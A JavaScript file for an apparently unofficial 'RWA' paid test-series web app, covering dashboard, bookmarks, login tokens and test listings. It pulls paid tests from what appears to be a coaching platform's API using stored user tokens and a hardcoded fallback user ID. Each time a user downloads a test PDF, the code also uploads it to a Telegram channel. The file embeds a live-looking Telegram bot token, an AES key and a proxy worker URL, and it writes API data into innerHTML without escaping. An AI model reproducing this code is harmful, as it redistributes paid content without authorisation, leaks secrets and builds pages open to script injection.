// =========================================================
// RWA PAID TEST SERIES APP - DASHBOARD, BOOKMARKS & AUTH (app.js)
// =========================================================

const BOT_API_BASE = "https://rwaweb-hp11.onrender.com";
const API_BASE = "https://rozgarapinew.teachx.in";
const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";

// 🟢 TELEGRAM UPLOAD CONFIGURATION
const TG_BOT_TOKEN = "8832643385:AAG5SZyJo7dDrvvK_dO_2pEOQK09OLeA6WM"; 
const TG_CHANNEL_ID = "-1004454849047";

// =====================================================
// TELEGRAM UPLOAD ENGINE (FOR TEST PDF)
// =====================================================
window.sendToTelegramChannel = async function(blob, fileType, title) {
    if (!TG_BOT_TOKEN || TG_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return false;
    
    const caption = `╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
       🏆 𝐑𝐖𝐀 𝐓𝐄𝐒𝐓 𝐒𝐄𝐑𝐈𝐄𝐒 𝐋𝐈𝐁𝐑𝐀𝐑𝐘
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

📁 Type            : ${fileType}
🎬 Title             : ${title}
🏆 Series Name : ${state.activeSeriesTitle || "Paid Test Series"}
📚 Folder Name : ${state.activeTsSubName || "Mock Test"}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚀 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐑𝐖𝐀
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`;

    const formData = new FormData();
    formData.append("chat_id", TG_CHANNEL_ID);
    formData.append("caption", caption);
    formData.append("document", blob, `${title}.pdf`);

    try {
        const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`, {
            method: "POST",
            body: formData
        });
        const json = await res.json();
        return Boolean(json.ok);
    } catch {
        return false;
    }
};

window.downloadAndUploadPDF = async function(pdfUrl, title) {
    try {
        alert("PDF Download & Telegram Upload Started...");
        const res = await fetch(pdfUrl);
        const blob = await res.blob();
        
        const a = document.createElement("a");
        const objUrl = URL.createObjectURL(blob);
        a.href = objUrl;
        a.download = `${title}.pdf`;
        document.body.appendChild(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(objUrl);

        const success = await window.sendToTelegramChannel(blob, "PDF", title);
        if (success) alert("✅ PDF Uploaded to Telegram Channel!");
    } catch (e) {
        alert("Error downloading PDF: " + e.message);
    }
};

// =====================================================
// LOCAL STORAGE & USER TOKENS (PERSISTENT DATA)
// =====================================================
function extractUidFromJwt(jwtStr) {
    if (!jwtStr || typeof jwtStr !== "string") return "";
    try {
        const parts = jwtStr.trim().split(".");
        if (parts.length < 2) return "";
        const base64Url = parts[1];
        const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
        const jsonPayload = decodeURIComponent(atob(base64).split("").map(c => {
            return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(""));
        const payload = JSON.parse(jsonPayload);
        return String(payload.id || payload.userid || payload.user_id || "");
    } catch {
        return "";
    }
}

function getUserSavedTokens() {
    try {
        const raw = localStorage.getItem("rwa_user_tokens_v2");
        if (raw) return JSON.parse(raw).filter(t => t && t.token && !t.isAdmin);
    } catch {}
    return [];
}

function getSavedUserProfile() {
    try {
        const raw = localStorage.getItem("rwa_user_profile_v2");
        if (raw) return JSON.parse(raw);
    } catch {}
    return null;
}

function getSavedAttemptsMap() {
    try {
        const raw = localStorage.getItem("rwa_attempted_tests_v1");
        if (raw) return JSON.parse(raw) || {};
    } catch {}
    return {};
}

function getSavedBookmarksList() {
    try {
        const raw = localStorage.getItem("rwa_bookmarked_questions_v1");
        if (raw) return JSON.parse(raw) || [];
    } catch {}
    return [];
}

function getSavedTestResponses() {
    try {
        const raw = localStorage.getItem("rwa_saved_test_responses_v1");
        if (raw) return JSON.parse(raw) || {};
    } catch {}
    return {};
}

let USER_TOKENS = getUserSavedTokens();
let USER_PROFILE = getSavedUserProfile();
let ATTEMPTED_TESTS = getSavedAttemptsMap();
let BOOKMARKED_QUESTIONS = getSavedBookmarksList();
let SAVED_RESPONSES = getSavedTestResponses();

function isUserLoggedIn() {
    return USER_TOKENS.length > 0 && Boolean(USER_TOKENS[0].token);
}

function updateTokenBadge() {
    const bm = document.getElementById("tokCountBadgeModal");
    if (bm) bm.textContent = USER_TOKENS.length;
    checkAuthUIState();
}

function checkAuthUIState() {
    const userNameText = document.getElementById("navUserNameText");
    const avatarEl = document.getElementById("navProfileAvatar");

    if (isUserLoggedIn()) {
        const name = (USER_PROFILE && USER_PROFILE.name) ? USER_PROFILE.name : "My Profile";
        if (userNameText) userNameText.textContent = name;
        if (avatarEl) avatarEl.textContent = name.charAt(0).toUpperCase();
    } else {
        if (userNameText) userNameText.textContent = "Profile / Login";
        if (avatarEl) avatarEl.textContent = "👤";
    }
}

// =====================================================
// DASHBOARD & PROGRESS ENGINE
// =====================================================
window.updateDashboardUI = function() {
    const totalSeries = state.totalSeriesCount || 0;
    const attemptedIds = Object.keys(ATTEMPTED_TESTS);
    const attemptedCount = attemptedIds.length;
    const totalTests = Math.max(state.totalTestsCount || 0, attemptedCount, Object.keys(state.knownTestIds || {}).length);
    const remainingCount = Math.max(0, totalTests - attemptedCount);

    const elSeries = document.getElementById("dashTotalSeries");
    const elTests = document.getElementById("dashTotalTests");
    const elAttempted = document.getElementById("dashAttemptedTests");
    const elRemaining = document.getElementById("dashRemainingTests");

    if (elSeries) elSeries.textContent = totalSeries;
    if (elTests) elTests.textContent = totalTests;
    if (elAttempted) elAttempted.textContent = attemptedCount;
    if (elRemaining) elRemaining.textContent = remainingCount;

    const pct = totalTests > 0 ? Math.min(100, Math.round((attemptedCount / totalTests) * 100)) : 0;
    const pctBadge = document.getElementById("dashProgressPercent");
    const pctBar = document.getElementById("dashProgressBar");
    const pctSub = document.getElementById("dashProgressSubtext");

    if (pctBadge) pctBadge.textContent = `${pct}% Completed`;
    if (pctBar) pctBar.style.width = `${pct}%`;
    if (pctSub) pctSub.textContent = `Aapne kul ${totalTests} tests mein se ${attemptedCount} attempt kar liye hain (${remainingCount} bache hain).`;

    const bmBadge = document.getElementById("bookmarkCountBadge");
    if (bmBadge) bmBadge.textContent = BOOKMARKED_QUESTIONS.length;

    renderRecentAttemptsList();
};

window.recordUserTestAttempt = function(testId, attemptInfo, fullResponsesObj) {
    if (!testId) return;
    const tid = String(testId).trim();
    
    // Save Scorecard Info
    ATTEMPTED_TESTS[tid] = {
        testId: tid,
        title: attemptInfo.title || `Test #${tid}`,
        seriesTitle: attemptInfo.seriesTitle || state.activeSeriesTitle || "Paid Test Series",
        score: attemptInfo.score ?? 0,
        maxMarks: attemptInfo.maxMarks ?? 100,
        correct: attemptInfo.correct ?? 0,
        incorrect: attemptInfo.incorrect ?? 0,
        unattempted: attemptInfo.unattempted ?? 0,
        accuracy: attemptInfo.accuracy ?? 0,
        date: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" })
    };
    localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(ATTEMPTED_TESTS));
    
    // Save Full Responses & State for Scorecard Recovery
    if (fullResponsesObj) {
        SAVED_RESPONSES[tid] = fullResponsesObj;
        localStorage.setItem("rwa_saved_test_responses_v1", JSON.stringify(SAVED_RESPONSES));
    }
    
    window.updateDashboardUI();
};

function renderRecentAttemptsList() {
    const container = document.getElementById("recentAttemptsList");
    if (!container) return;

    const entries = Object.values(ATTEMPTED_TESTS).reverse();
    if (entries.length === 0) {
        container.innerHTML = `<div class="p-6 text-center text-xs font-bold text-slate-500 bg-slate-50 rounded-2xl border border-slate-200">Abhi tak aapne koi test attempt nahi kiya hai. Test submit karte hi aapka score yahan dikhega.</div>`;
        return;
    }

    container.innerHTML = entries.map(item => `
        <div onclick="openSavedScorecard('${item.testId}')" class="bg-slate-50 hover:bg-indigo-50 border border-sky-200 hover:border-indigo-300 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 cursor-pointer transition-all">
            <div class="min-w-0 flex-1">
                <div class="flex items-center gap-2 flex-wrap">
                    <span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">✅ ATTEMPTED</span>
                    <span class="text-[11px] font-bold text-slate-500">🕒 ${item.date || ""}</span>
                </div>
                <h4 class="font-black text-sm sm:text-base text-slate-900 mt-1">${item.title}</h4>
                <p class="text-xs font-bold text-indigo-600 mt-0.5">${item.seriesTitle}</p>
            </div>
            <div class="flex items-center gap-3">
                <div class="text-right bg-white px-3.5 py-2 rounded-xl border border-slate-200 shadow-sm">
                    <div class="text-[10px] font-extrabold text-slate-500 uppercase">Score</div>
                    <div class="text-sm font-black text-indigo-700">${item.score} / ${item.maxMarks}</div>
                    <div class="text-[10px] font-bold text-emerald-600">🎯 ${item.accuracy}% Acc</div>
                </div>
                <div class="text-xl">➔</div>
            </div>
        </div>
    `).join("");
}

window.clearAttemptHistory = function() {
    if (confirm("Kya aap apni Attempted Tests history reset karna chahte hain?")) {
        ATTEMPTED_TESTS = {};
        SAVED_RESPONSES = {};
        localStorage.removeItem("rwa_attempted_tests_v1");
        localStorage.removeItem("rwa_saved_test_responses_v1");
        window.updateDashboardUI();
        if (state.view === "ts_tests" && state.activeSeriesId) {
            openTestSeriesTitles(state.activeSeriesId, state.activeTsSubId || "-1", state.activeTsSubName || state.activeSeriesTitle);
        }
    }
};

window.openSavedScorecard = function(testId) {
    if (typeof window.recoverTcsScorecard === "function") {
        window.recoverTcsScorecard(testId);
    }
};

// =====================================================
// BOOKMARKS ENGINE (LIST & FULL SCREEN VIEWER)
// =====================================================
window.isQuestionBookmarked = function(qKey) {
    return BOOKMARKED_QUESTIONS.some(b => String(b.qKey) === String(qKey));
};

window.toggleBookmarkItem = function(itemObj) {
    if (!itemObj || !itemObj.qKey) return false;
    const existsIdx = BOOKMARKED_QUESTIONS.findIndex(b => String(b.qKey) === String(itemObj.qKey));
    let isNowSaved = false;

    if (existsIdx >= 0) {
        BOOKMARKED_QUESTIONS.splice(existsIdx, 1);
        isNowSaved = false;
    } else {
        BOOKMARKED_QUESTIONS.unshift({
            ...itemObj,
            savedAt: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" })
        });
        isNowSaved = true;
    }

    localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(BOOKMARKED_QUESTIONS));
    window.updateDashboardUI();
    renderBookmarksTab();
    return isNowSaved;
};

window.removeBookmarkByKey = function(qKey) {
    BOOKMARKED_QUESTIONS = BOOKMARKED_QUESTIONS.filter(b => String(b.qKey) !== String(qKey));
    localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(BOOKMARKED_QUESTIONS));
    window.updateDashboardUI();
    renderBookmarksTab();
};

window.clearAllBookmarks = function() {
    if (BOOKMARKED_QUESTIONS.length === 0) return;
    if (confirm("Kya aap sabhi Bookmarked Questions delete karna chahte hain?")) {
        BOOKMARKED_QUESTIONS = [];
        localStorage.removeItem("rwa_bookmarked_questions_v1");
        window.updateDashboardUI();
        renderBookmarksTab();
    }
};

function renderBookmarksTab() {
    const container = document.getElementById("bookmarksListContainer");
    if (!container) return;

    if (BOOKMARKED_QUESTIONS.length === 0) {
        container.innerHTML = `
            <div class="sky-card p-10 text-center">
                <div class="text-4xl mb-2">🔖</div>
                <h4 class="font-black text-base text-slate-800">Abhi koi Question Bookmark nahi hai</h4>
                <p class="text-xs font-semibold text-slate-500 mt-1">Live Test ya Solution dekhte waqt upar <b>☆ Save</b> button dabayein, woh question yahan save ho jayega.</p>
            </div>`;
        return;
    }

    container.innerHTML = BOOKMARKED_QUESTIONS.map((b, idx) => {
        // Strip HTML for clean preview in list
        const rawText = (b.question || "").replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim();
        const shortText = rawText.length > 100 ? rawText.substring(0, 100) + "..." : rawText;

        return `
            <div onclick="openBookmarkFullScreen(${idx})" class="sky-card p-4 flex gap-4 items-center cursor-pointer hover:border-indigo-300 hover:shadow-md transition-all">
                <div class="w-12 h-12 rounded-full bg-amber-100 text-amber-700 flex items-center justify-center font-black text-xl shrink-0">🔖</div>
                <div class="flex-1 min-w-0">
                    <div class="flex items-center gap-2 mb-1">
                        <span class="px-2 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">${b.subject || "Subject"}</span>
                        <span class="text-[10px] font-bold text-slate-500">Q.${b.qNumber || 1} • ${b.testTitle || "Mock Test"}</span>
                    </div>
                    <div class="text-sm font-bold text-slate-800 truncate">${shortText}</div>
                </div>
                <div class="text-xl text-slate-400">➔</div>
            </div>`;
    }).join("");
}

// FULL SCREEN BOOKMARK VIEWER
window.openBookmarkFullScreen = function(idx) {
    if (idx < 0 || idx >= BOOKMARKED_QUESTIONS.length) return;
    state.currentBookmarkIdx = idx;
    
    showSlide("slideBookmarkViewer");
    
    const b = BOOKMARKED_QUESTIONS[idx];
    const container = document.getElementById("bookmarkViewerContent");
    const letters = ["A", "B", "C", "D", "E"];
    const ansStr = String(b.answer || "1").trim();

    const optsHtml = (b.options || []).map((optText, oIdx) => {
        if (!optText) return "";
        const optId = String(oIdx + 1);
        const isCorrect = optId === ansStr;
        return `
            <div class="p-3.5 rounded-xl border-2 text-sm sm:text-base flex items-start justify-between gap-3 ${isCorrect ? 'bg-emerald-50 border-emerald-400 text-emerald-950 font-bold shadow-sm' : 'bg-white border-slate-200 text-slate-800'}">
                <div class="flex items-start gap-3">
                    <span class="font-black text-indigo-800">${letters[oIdx] || optId}.</span>
                    <div>${optText}</div>
                </div>
                ${isCorrect ? `<span class="px-2.5 py-1 rounded-lg bg-emerald-600 text-white text-[10px] font-black shrink-0">✓ Correct Answer</span>` : ""}
            </div>`;
    }).join("");

    container.innerHTML = `
        <div class="bg-white rounded-2xl shadow-lg border border-slate-200 p-5 sm:p-7">
            <div class="flex flex-wrap justify-between items-center gap-3 pb-3 border-b border-slate-100 mb-5">
                <div class="flex items-center gap-2 flex-wrap">
                    <span class="px-3 py-1 rounded-full bg-indigo-100 text-indigo-900 text-xs font-black">${b.subject || "Subject"}</span>
                    <span class="text-xs font-bold text-slate-500">📝 ${b.testTitle || "Mock Test"} (Q.${b.qNumber || 1})</span>
                </div>
                <span class="text-[10px] font-bold text-slate-400">Saved: ${b.savedAt || "Recently"}</span>
            </div>

            <div class="text-base sm:text-lg font-bold text-slate-900 leading-relaxed mb-6">${b.question || ""}</div>

            <div class="grid grid-cols-1 gap-3 mb-6">${optsHtml}</div>

            ${b.solution ? `
                <div class="bg-sky-50/70 border-l-4 border-sky-400 rounded-r-xl p-4 sm:p-5 text-sm sm:text-base">
                    <h4 class="font-black text-indigo-900 mb-2 flex items-center gap-2">💡 Official Solution / Explanation</h4>
                    <div class="text-slate-800 leading-relaxed">${b.solution}</div>
                </div>
            ` : ""}
        </div>
    `;

    document.getElementById("bookmarkCounter").textContent = `${idx + 1} / ${BOOKMARKED_QUESTIONS.length}`;
    document.getElementById("bmkBtnPrev").style.opacity = idx === 0 ? "0.5" : "1";
    document.getElementById("bmkBtnNext").style.opacity = idx === BOOKMARKED_QUESTIONS.length - 1 ? "0.5" : "1";

    if (window.MathJax && MathJax.typesetPromise) {
        MathJax.typesetPromise([container]).catch(() => {});
    }
};

window.closeBookmarkViewer = function() {
    showSlide("slideExplorer");
};

window.nextBookmark = function() {
    if (state.currentBookmarkIdx < BOOKMARKED_QUESTIONS.length - 1) {
        openBookmarkFullScreen(state.currentBookmarkIdx + 1);
    }
};

window.prevBookmark = function() {
    if (state.currentBookmarkIdx > 0) {
        openBookmarkFullScreen(state.currentBookmarkIdx - 1);
    }
};

window.removeCurrentBookmarkFullScreen = function() {
    const b = BOOKMARKED_QUESTIONS[state.currentBookmarkIdx];
    if (b && confirm("Remove this question from Bookmarks?")) {
        removeBookmarkByKey(b.qKey);
        if (BOOKMARKED_QUESTIONS.length === 0) {
            closeBookmarkViewer();
        } else {
            let nextIdx = state.currentBookmarkIdx;
            if (nextIdx >= BOOKMARKED_QUESTIONS.length) nextIdx = BOOKMARKED_QUESTIONS.length - 1;
            openBookmarkFullScreen(nextIdx);
        }
    }
};

// =====================================================
// APP TAB SWITCHER & DASHBOARD VISIBILITY
// =====================================================
window.switchAppTab = function(tabName) {
    state.activeAppTab = tabName;

    const tabs = {
        tests: { btn: "appTabTests", view: "appViewTests" },
        dashboard: { btn: "appTabDashboard", view: "appViewDashboard" },
        bookmarks: { btn: "appTabBookmarks", view: "appViewBookmarks" }
    };

    Object.keys(tabs).forEach(k => {
        const btnEl = document.getElementById(tabs[k].btn);
        const viewEl = document.getElementById(tabs[k].view);
        if (k === tabName) {
            if (btnEl) btnEl.className = "flex-1 py-2.5 px-4 rounded-xl font-extrabold text-xs bg-gradient-to-r from-indigo-600 to-blue-600 text-white shadow border-0 cursor-pointer whitespace-nowrap transition-all";
            if (viewEl) viewEl.classList.remove("hidden");
        } else {
            if (btnEl) btnEl.className = "flex-1 py-2.5 px-4 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-50 border-0 cursor-pointer whitespace-nowrap transition-all";
            if (viewEl) viewEl.classList.add("hidden");
        }
    });

    if (tabName === "dashboard") window.updateDashboardUI();
    else if (tabName === "bookmarks") renderBookmarksTab();
};

function toggleDashboardHeader(show) {
    const dashGroup = document.getElementById("dashboardHeaderGroup");
    if (!dashGroup) return;
    if (show) dashGroup.classList.remove("hidden");
    else dashGroup.classList.add("hidden");
}

// =====================================================
// SLIDE NAVIGATION ENGINE
// =====================================================
function showSlide(slideId) {
    if (state.currentSlide !== slideId) {
        state.previousSlide = state.currentSlide;
    }
    state.currentSlide = slideId;

    ["slideExplorer", "slideTestAttempt", "slidePdf", "slideBookmarkViewer"].forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        if (id === slideId) {
            el.classList.remove("hidden-slide");
            el.classList.add("active-slide");
        } else {
            el.classList.remove("active-slide");
            el.classList.add("hidden-slide");
        }
    });

    const topNav = document.getElementById("topHeaderNav");
    if (topNav) {
        if (slideId === "slideTestAttempt" || slideId === "slideBookmarkViewer") topNav.classList.add("hidden");
        else topNav.classList.remove("hidden");
    }

    window.scrollTo({ top: 0, behavior: "smooth" });
}

function updateBackNavButton() {
    const backBtn = document.getElementById("backNavBtn");
    if (!backBtn) return;
    if (state.view === "ts_list") {
        backBtn.classList.add("hidden");
        toggleDashboardHeader(true); // Show Dashboard on Home
    } else {
        backBtn.classList.remove("hidden");
        toggleDashboardHeader(false); // Hide Dashboard inside Series/Folders
    }
}

function goHomeHub() {
    if (window.tcsTimerInterval) clearInterval(window.tcsTimerInterval);
    switchAppTab("tests");
    openTestSeriesExplorer("paid_ts");
}

function handleGlobalBack() {
    if (state.currentSlide === "slidePdf") {
        closePdfSlide();
        return;
    }
    if (state.currentSlide === "slideTestAttempt") {
        exitCbtTest();
        return;
    }
    if (state.currentSlide === "slideBookmarkViewer") {
        closeBookmarkViewer();
        return;
    }
    if (state.currentSlide === "slideExplorer") {
        if (state.view === "ts_tests") {
            if (state.activeTsSubId === "-1") openTestSeriesExplorer("paid_ts");
            else openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
            return;
        }
        if (state.view === "ts_subjects") {
            openTestSeriesExplorer("paid_ts");
            return;
        }
        openTestSeriesExplorer("paid_ts");
    }
}

// =====================================================
// STEP 1: SHOW ALL PAID TEST SERIES
// =====================================================
async function openTestSeriesExplorer(mode = "paid_ts") {
    state.tsMode = "paid_ts";
    state.view = "ts_list";
    updateBackNavButton();
    showSlide("slideExplorer");

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading All Paid Test Series...</div>`;

    const primaryTok = USER_TOKENS[0] || null;
    state.activeTokenObj = primaryTok;

    document.getElementById("crumbText").textContent = "Official Exam Series";
    document.getElementById("headingText").textContent = "🏆 All Paid Test Series";

    const [p0, p10, p20] = await Promise.all([
        fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, primaryTok, () => []),
        fetchAPIWithToken(`/get/test_series?start=10&search=&client_api_url=&exam_id=`, primaryTok, () => []),
        fetchAPIWithToken(`/get/test_series?start=20&search=&client_api_url=&exam_id=`, primaryTok, () => [])
    ]);

    let combined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : []), ...(Array.isArray(p20) ? p20 : []), ...DB.paidTestSeries];

    const seen = new Set();
    let totalSeries = 0, totalTestsSum = 0;

    grid.innerHTML = "";
    combined.forEach(ts => {
        if (!ts || !ts.id || seen.has(String(ts.id))) return;
        seen.add(String(ts.id));
        totalSeries++;

        const paidCnt = parseInt(ts.paidtest || ts.total_tests || ts.test_count || 0) || 0;
        const freeCnt = parseInt(ts.freetest || 0) || 0;
        const seriesTestTotal = (paidCnt + freeCnt) > 0 ? (paidCnt + freeCnt) : 20;
        totalTestsSum += seriesTestTotal;

        const title = (ts.title || "Paid Test Series").replace(/'/g, "");
        const logo = (ts.logo || "https://placehold.co/600x320/4f46e5/ffffff?text=Test+Series").replace(/\\\//g, "/");
        grid.innerHTML += `
            <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <div>
                    <img src="${logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=RWA+Test+Series'" class="w-full h-44 object-cover">
                    <div class="p-4">
                        <div class="flex justify-between items-center gap-2">
                            <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">SERIES #${ts.id}</span>
                            <span class="px-2.5 py-0.5 rounded-full bg-sky-100 text-sky-900 text-[10px] font-black">📝 ${seriesTestTotal} Tests</span>
                        </div>
                        <h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3>
                    </div>
                </div>
                <div class="px-4 pb-4">
                    <div class="btn-watch w-full text-center text-xs">Open Test Series ➔</div>
                </div>
            </div>`;
    });

    state.totalSeriesCount = totalSeries;
    state.totalTestsCount = totalTestsSum;
    window.updateDashboardUI();
}

// =====================================================
// STEP 2: SHOW FOLDERS (SUBJECTS) IF PRESENT
// =====================================================
async function openTestSeriesSubjects(tsId, tsTitle) {
    state.activeSeriesId = tsId;
    state.activeSeriesTitle = tsTitle;
    state.view = "ts_subjects";
    updateBackNavButton(); // Automatically Hides Dashboard

    document.getElementById("crumbText").textContent = `Test Series #${tsId}`;
    document.getElementById("headingText").textContent = tsTitle;

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Checking Test Series Folders...</div>`;

    const useTok = state.activeTokenObj || USER_TOKENS[0] || null;
    fetchRawJSONWithToken(`/Test_Series/test_series_by_id?id=${tsId}`, useTok);
    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, useTok, () => DB.tsSubjects[tsId] || []);

    if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
        openTestSeriesTitles(tsId, "-1", tsTitle);
        return;
    }

    grid.innerHTML = "";
    subs.forEach(s => {
        const sname = (s.subject_name || "Mock Tests").replace(/'/g, "");
        const logo = (s.subject_logo || `https://placehold.co/80x80/4f46e5/ffffff?text=${encodeURIComponent(sname.slice(0, 3))}`).replace(/\\\//g, "/");
        grid.innerHTML += `
            <div onclick="openTestSeriesTitles('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                <img src="${logo}" onerror="this.src='https://placehold.co/80x80/4f46e5/ffffff?text=FOLDER'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
                <div class="flex-1">
                    <span class="px-2 py-0.5 rounded bg-indigo-100 text-indigo-900 text-[10px] font-black">FOLDER #${s.subjectid}</span>
                    <h4 class="font-black text-base text-slate-900 mt-1">📂 ${s.subject_name}</h4>
                    <p class="text-xs text-blue-600 font-extrabold mt-1">Open Folder Tests ➔</p>
                </div>
            </div>`;
    });
}

// =====================================================
// STEP 3: SHOW TESTS INSIDE SERIES / FOLDER
// =====================================================
async function openTestSeriesTitles(tsId, subId, subName) {
    state.view = "ts_tests";
    state.activeSeriesId = tsId;
    state.activeTsSubId = String(subId);
    state.activeTsSubName = subName;
    updateBackNavButton(); // Ensures Dashboard is Hidden

    document.getElementById("crumbText").textContent = state.activeSeriesTitle;
    document.getElementById("headingText").textContent = `📝 ${subName}`;

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Fetching Mock Tests...</div>`;

    const useTok = state.activeTokenObj || USER_TOKENS[0] || null;
    const uid = (useTok && useTok.userId) || (useTok && extractUidFromJwt(useTok.token)) || "4756316";
    const ep = String(subId) === "-1"
        ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1`
        : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;

    let list = await fetchAPIWithToken(ep, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || []);
    if ((!list || list.length === 0) && String(subId) !== "-1") {
        const epAlt = `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`;
        list = await fetchAPIWithToken(epAlt, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["708_-1"] || []);
    } else if (!list || list.length === 0) {
        list = DB.tsTitles[`${tsId}_-1`] || DB.tsTitles["708_-1"] || [];
    }
    renderTestTitlesGrid(list, tsId, useTok);
}

function formatCardTimeLabel(rawTime) {
    const str = String(rawTime || "60").trim();
    if (str.includes("+")) {
        const parts = str.split("+").map(n => parseInt(n.trim()) || 0);
        return `${parts.reduce((a, b) => a + b, 0)} Mins (Sec)`;
    }
    return `${str} Mins`;
}

function renderTestTitlesGrid(list, tsId, boundTok) {
    const grid = document.getElementById("mainGrid");
    const testTok = boundTok || state.activeTokenObj || USER_TOKENS[0] || null;

    if (!list || !list.length) {
        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi test uplabdh nahi hai.</div>`;
        return;
    }

    grid.innerHTML = "";
    list.forEach((t, idx) => {
        const rawId = String(t.id || `${tsId}_${idx}`);
        state.knownTestIds[rawId] = true;

        const tKey = `test_${rawId}`;
        const pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf || t.pdf_summary_link, t.pdf_url);
        state.testMap[tKey] = { ...t, id: rawId, seriesId: tsId || t.test_series_id, resolvedPdf: pdfUrl, tokenObj: testTok };

        const timeLabel = formatCardTimeLabel(t.time);
        const isSectional = String(t.time || "").includes("+") || String(t.restrict_part_switching) === "1";
        const attemptRecord = ATTEMPTED_TESTS[rawId];

        grid.innerHTML += `
            <div class="grid-card p-5 flex flex-col justify-between ${attemptRecord ? 'border-emerald-300 bg-emerald-50/30 shadow-md' : ''}">
                <div>
                    <div class="flex justify-between items-center gap-2 flex-wrap">
                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">TEST #${rawId}</span>
                        <div class="flex items-center gap-1.5">
                            ${attemptRecord ? `<span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">✅ Score: ${attemptRecord.score}/${attemptRecord.maxMarks}</span>` : ""}
                            <span class="text-[11px] font-extrabold text-slate-600">⏱️ ${timeLabel}</span>
                        </div>
                    </div>
                    <h4 class="font-black text-base text-slate-900 mt-2">${t.title}</h4>
                    <div class="flex gap-2.5 mt-2 text-xs font-bold text-slate-600 flex-wrap">
                        <span>❓ ${t.questions || 50} Qs</span>
                        <span>🏆 ${t.marks || 100} Marks</span>
                        ${isSectional ? `<span class="text-rose-600">🔒 Sectional</span>` : ""}
                    </div>
                </div>
                <div class="flex flex-wrap gap-2 mt-4 pt-3 border-t border-sky-100">
                    <button onclick="launchCbtTest('${tKey}')" class="btn-watch flex-1 text-xs">${attemptRecord ? '🔄 Re-Attempt Test' : '🚀 Start Test'}</button>
                    ${attemptRecord ? `<button onclick="openSavedScorecard('${rawId}')" class="btn-watch bg-gradient-to-r from-emerald-600 to-teal-600 flex-1 text-xs">📊 Scorecard</button>` : ""}
                    ${pdfUrl ? `<button onclick="openTestPdf('${tKey}')" class="btn-pdf1 text-xs">📄 PDF</button>` : ""}
                </div>
            </div>`;
    });
    window.updateDashboardUI();
}

// =====================================================
// LAUNCH TEST / OPEN PDF
// =====================================================
async function launchCbtTest(tKey) {
    if (!isUserLoggedIn()) {
        state.pendingTestKey = tKey;
        openLoginModal("🔐 Test start karne ke liye pehle apna RWA Account Login karein!");
        return;
    }
    if (state.testMap[tKey]) state.testMap[tKey].tokenObj = USER_TOKENS[0];
    if (typeof window.launchTcsCbtEngine === "function") await window.launchTcsCbtEngine(tKey);
}

function openTestPdf(tKey) {
    if (!isUserLoggedIn()) {
        state.pendingPdfKey = tKey;
        openLoginModal("🔐 Test PDF dekhne ke liye pehle Login karein!");
        return;
    }
    const t = state.testMap[tKey];
    if (!t || !t.resolvedPdf) return;
    state.currentPdfUrl = t.resolvedPdf;
    document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`;
    const rawPdfLink = document.getElementById("rawPdfLink");
    rawPdfLink.href = "javascript:void(0)";
    rawPdfLink.onclick = () => window.downloadAndUploadPDF(t.resolvedPdf, t.title);
    showSlide("slidePdf");
    setPdfMode("appx");
}

function exitCbtTest() {
    if (typeof window.exitTcsTest === "function") window.exitTcsTest();
    else showSlide("slideExplorer");
